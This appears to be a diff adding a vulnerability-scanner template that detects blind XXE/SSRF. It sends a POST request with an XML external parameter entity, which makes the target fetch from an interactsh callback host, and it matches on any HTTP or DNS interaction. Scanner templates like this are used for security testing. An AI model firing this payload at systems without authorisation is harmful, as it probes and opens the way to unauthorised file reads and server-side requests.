@@ -1,0 +1,30 @@
+id: xxe-via-r-ssrf
+
+info:
+  name: SSRF Root
+  author: reewardius
+  severity: high
+  reference: https://honoki.net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/
+  tags: xxe,generic
+  
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
+        Content-Type: application/xml;charset=UTF-8
+        
+        <?xml version="1.0" ?>
+        <!DOCTYPE root [
+        <!ENTITY % ext SYSTEM "http://{{interactsh-url}}/x"> %ext;
+        ]>
+        <r></r>
+        
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
